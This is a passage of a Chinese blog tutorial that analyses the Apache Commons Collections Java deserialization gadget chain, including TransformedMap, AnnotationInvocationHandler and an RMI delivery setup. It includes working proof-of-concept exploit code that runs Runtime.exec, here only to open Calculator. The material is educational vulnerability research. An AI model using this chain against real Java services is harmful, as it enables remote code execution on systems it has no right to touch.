</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="comment">//传入Runtime类</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">"open -a Calculator"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        serialize(transformerChain);</span><br><span class="line">        <span class="comment">// 通过进一步构造反射链，这里的transform传递一个空参数即可。</span></span><br><span class="line">        Transformer transformer = (Transformer) unserialize();</span><br><span class="line">        transformer.transform(<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Transformer obj)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"test.ser"</span>));</span><br><span class="line">            os.writeObject(obj);</span><br><span class="line">            os.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectInputStream is = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"test.ser"</span>));</span><br><span class="line">            <span class="keyword">return</span> is.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/01/24/6zEDQwSP1xWdsFU.jpg" alt="-w1246"></p><p>在<code>Transformer</code>数组的第一个元素中用到了<code>ConstantTransformer</code>类：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 64行</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>通过初始化对象传入<code>Runtime.class</code>类作为参数，然后在<code>ChainedTransformer</code>类遍历数组调用其 <code>ConstantTransformer</code>的<code>transform</code>方法返回<code>Runtime</code>类。</p><p>从<code>transformer.transform(&quot;&quot;);</code>下断点跟进：<br><img src="https://i.loli.net/2020/01/24/4MBFi8WhOEe5r2N.jpg" alt="-w1057"></p><p>遍历数组，第一次进入<code>ConstantTransformer</code>的<code>transform</code>函数：<br><img src="https://i.loli.net/2020/01/24/9DYVheXwbS857Ro.jpg" alt="-w1286"></p><p><code>ConstantTransformer</code>的<code>transform</code>返回在实例化时传入的<code>Runtime</code>类：<br><img src="https://i.loli.net/2020/01/24/RqaKzGPcZdwv1T6.jpg" alt="-w1030"></p><p>第二次循环，将第一次返回的<code>Runtime</code>类作为参数，带入第二次<code>InvokerTransformer</code>类的<code>transform</code>函数参数中：<br><img src="https://i.loli.net/2020/01/24/lwaF1V6kXL7y3tY.jpg" alt="-w1098"><br>这里通过java反射机制，从<code>Runtime</code>类找到其<code>getRuntime</code>方法，返回<code>Runtime.getRuntime()</code>方法，作为下次循环的参数。<br><img src="https://i.loli.net/2020/01/24/Pki7JXqBOItxyE4.jpg" alt="-w1150"></p><p>第三次循环再次通过<code>InvokerTransformer</code>类的<code>transform</code>方法，通过反射调用<code>invoke</code>方法，真正的执行<code>getRuntime</code>函数并返回<code>Runtime</code>实例<br><img src="https://i.loli.net/2020/01/24/eiC4bFSq2aI5RYy.jpg" alt="-w1227"></p><p>在第四轮中我们可以看到<code>object</code>参数变成了<code>Runtime</code>对象，并且通过反射调用<code>exec</code>函数来进行命令执行：<br><img src="https://i.loli.net/2020/01/24/hDa3kjMlTLWz4Jc.jpg" alt="-w1233"><br>最后执行命令：<br><img src="https://i.loli.net/2020/01/24/Je7AtBpTSZDlMiW.jpg" alt="-w1251"></p><h3 id="step3：寻找自动触发transform"><a href="#step3：寻找自动触发transform" class="headerlink" title="step3：寻找自动触发transform"></a>step3：寻找自动触发<code>transform</code></h3><p>在step2的poc中我们可以看到，反序列化之后其实还有一个对对象进行<code>transform</code>函数的调用，虽然此时已经通过反射链解决了<code>Runtime.getRuntime()</code>的参数传入问题，但是仍然需要我们调用<code>transform</code>函数。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Transformer transformer = (Transformer) unserialize();</span><br><span class="line">transformer.transform(<span class="string">""</span>);</span><br></pre></td></tr></table></figure></p><p>这样的条件在实际环境中是难以利用的，我们希望的是仅调用<code>readObject</code>函数就能够触发漏洞，即需要寻找一个有被重写的<code>readObject</code>函数，而其中的流程能够触发<code>transform</code>函数(可以直接搜索这两个关键字寻找)。</p><p>在<code>/org/apache/commons/collections/map/TransformedMap.java</code>中:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//65行</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//87行</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(map);</span><br><span class="line">        <span class="keyword">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="keyword">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//137行</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Object <span class="title">transformValue</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (valueTransformer == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> object;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> valueTransformer.transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//183行</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">put</span><span class="params">(Object key, Object value)</span> </span>&#123;</span><br><span class="line">        key = transformKey(key);</span><br><span class="line">        value = transformValue(value);</span><br><span class="line">        <span class="keyword">return</span> getMap().put(key, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>通过<code>TransformedMap</code>函数设置成员变量，通过调用<code>put</code>函数，触发<code>transformValue</code>函数的<code>valueTransformer.transform(object)</code>调用。<br>poc：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"open /Applications/Calculator.app/"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建Map并绑定transformerChain</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/01/24/RomdYKtbCOTkcFy.jpg" alt="-w1270"></p><p>虽然找到了一个能自动调用<code>transform</code>的过程，但是要实现反序列化命令执行，还需要有对map的操作。这里还有另外一处也有调用<code>transform</code>方法的功能：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 168行</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">checkSetValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在其父类<code>/org/apache/commons/collections/map/AbstractInputCheckedMapDecorator.java</code>中实现了一个静态类的定义：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 180行</span></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MapEntry</span> <span class="keyword">extends</span> <span class="title">AbstractMapEntryDecorator</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** The parent map */</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">MapEntry</span><span class="params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(entry);</span><br><span class="line">            <span class="keyword">this</span>.parent = parent;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">setValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">            value = parent.checkSetValue(value); <span class="comment">// 调用点</span></span><br><span class="line">            <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>这里用了java类的嵌套，和php语言特性有点区别：<a href="https://blog.csdn.net/hguisu/article/details/7270086" target="_blank" rel="noopener">https://blog.csdn.net/hguisu/article/details/7270086</a></p></blockquote><h3 id="step3-寻找重写readObject"><a href="#step3-寻找重写readObject" class="headerlink" title="step3: 寻找重写readObject"></a>step3: 寻找重写<code>readObject</code></h3><p>在jdk小于等于1.7的时，<code>/sun/reflect/annotation/AnnotationInvocationHandler.class</code>中的<code>readObject</code>中有对map的修改功能。<br><img src="https://i.loli.net/2020/01/24/FiMA97cGHfxwbKO.jpg" alt="-w1052"></p><p>这里便于分析，用<code>jd-gui</code>将其jar包逆向：<br><code>/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/rt.jar</code><br><img src="https://i.loli.net/2020/01/24/DiWuAnQ6bIrUXjw.jpg" alt="-w1435"><br>这里<code>readObject</code>方法，使用了<code>entry.setValue</code>方法。</p><p>在构造方法中，我们可以看到其将实例化传入的参数设为其成员变量<code>this.memberValues</code>,接着在反序列化的时候，通过对<code>readObject</code>的调用，触发<code>MapEntry</code>的<code>setValue</code>方法。<br><img src="https://i.loli.net/2020/01/24/yLIuHtvA5WdT4Fk.jpg" alt="-w945"></p><p>最后poc用了java反射去实例化创建对象，构造出一个完整的攻击链：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"open /Applications/Calculator.app/"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(<span class="string">"value"</span>, <span class="string">"2"</span>); <span class="comment">// 满足/org/apache/commons/collections/map/AbstractMapDecorator.java的null判断,但是不知道为什么键名一定要是value，调了很多次还是没解决，求解</span></span><br><span class="line"></span><br><span class="line">        Map transformedmap = TransformedMap.decorate(map, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 加载类</span></span><br><span class="line">        Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化</span></span><br><span class="line">        Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class); <span class="comment">// 获取指定的构造方法</span></span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);   <span class="comment">//为反射对象设置可访问标志</span></span><br><span class="line">        Object ins = cons.newInstance(java.lang.annotation.Retention.class,transformedmap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        ByteArrayOutputStream exp = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(exp);</span><br><span class="line">        oos.writeObject(ins);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream out = <span class="keyword">new</span> ByteArrayInputStream(exp.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(out);</span><br><span class="line">        Object obj = (Object) ois.readObject();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/01/24/dA61aGYruVTivCI.jpg" alt="-w1125"></p><p>流程：参考seebug的一张图<br><img src="https://i.loli.net/2020/01/24/H1WBxCctdLiRKuT.jpg" alt="-w1295"></p><h2 id="远程利用实现"><a href="#远程利用实现" class="headerlink" title="远程利用实现"></a>远程利用实现</h2><p>先学习几个概念：</p><ul><li>RMI(Remote Method Invocation)是一种基于序列化Java远程方法调用机制，作为一个常见的反序列化入口，和反序列化漏洞有密切联系。利用这种机制可以让某台服务器上的对象在调用另外一台服务器上的方法时，和在本地机上对象间的方法调用的语法规则一样。</li><li>JNDI（Java Naming and Directory Interface），Java 命名与目录接口(JNDI是注册表可以包含很多的RMI，客户端调用RMI记录的时候会先去JNDI这个本子，然后从本子上找相应的RMI记录)<br>(还有很多概念，先挖坑)</li></ul><h3 id="RMI服务端实现"><a href="#RMI服务端实现" class="headerlink" title="RMI服务端实现"></a>RMI服务端实现</h3><p>构造一个User接口：User.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Remote</span></span>&#123;</span><br><span class="line">    <span class="function">String <span class="title">name</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">say</span><span class="params">(String say)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">dowork</span><span class="params">(Object work)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>实现User接口：UserImpl.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">name</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">say</span><span class="params">(String say)</span> <span class="keyword">throws</span>  RemoteException</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"you speak"</span> + say);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dowork</span><span class="params">(Object work)</span> <span class="keyword">throws</span>  RemoteException</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"your work is "</span> + work);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>实现Server端：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String url = <span class="string">"rmi://192.168.43.112:4396/User"</span>;</span><br><span class="line">        User user = <span class="keyword">new</span> UserImpl();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">4396</span>);</span><br><span class="line">        Naming.bind(url,user);</span><br><span class="line">        System.out.println(<span class="string">"the rmi is running :"</span> + url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行监听：<br><img src="https://i.loli.net/2020/01/25/T1ONzCtkoGPQBWL.jpg" alt="-w993"></p><p>客户端UserClient:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String url = <span class="string">"rmi://192.168.43.112:4396/User"</span>;</span><br><span class="line">        User userClient = (User)Naming.lookup(url);</span><br><span class="line"></span><br><span class="line">        System.out.println(userClient.name(<span class="string">"test"</span>));</span><br><span class="line">        userClient.say(<span class="string">"world"</span>);</span><br><span class="line">        userClient.dowork(getpayload());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span 